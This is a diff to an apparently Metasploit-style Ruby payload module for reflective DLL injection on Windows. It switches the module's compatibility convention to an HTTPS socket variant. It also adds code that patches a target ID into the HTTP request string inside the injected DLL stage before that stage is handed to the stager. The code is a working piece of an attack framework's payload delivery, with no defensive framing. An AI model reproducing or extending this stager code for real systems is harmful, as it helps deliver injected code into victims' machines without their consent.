@@ -27,7 +27,7 @@ module Payload::Windows::ReflectiveDllInject
 			'Arch'          => ARCH_X86,
 			'PayloadCompat' =>
 				{
-					'Convention' => 'sockedi',
+					'Convention' => 'sockedi -https',
 				},
 			'Stage'         =>
 				{
@@ -46,7 +46,7 @@ module Payload::Windows::ReflectiveDllInject
 		datastore['DLL']
 	end
 
-	def stage_payload
+	def stage_payload(target_id=nil)
 		dll    = ""
 		offset = 0
 
@@ -98,6 +98,18 @@ module Payload::Windows::ReflectiveDllInject
 
 		# patch the bootstrap code into the dll's DOS header...
 		dll[ 0, bootstrap.length ] = bootstrap
+
+		# patch the target ID into the URI if specified
+		if target_id
+			i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
+			if i
+				t = target_id.to_s
+				raise "Target ID must be less than 9 bytes" if t.length > 8
+				u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
+				print_status("Patching Target ID #{t} into DLL")
+				dll[i, u.length] = u
+			end
+		end
 
 		# return our stage to be loaded by the intermediate stager
 		return dll
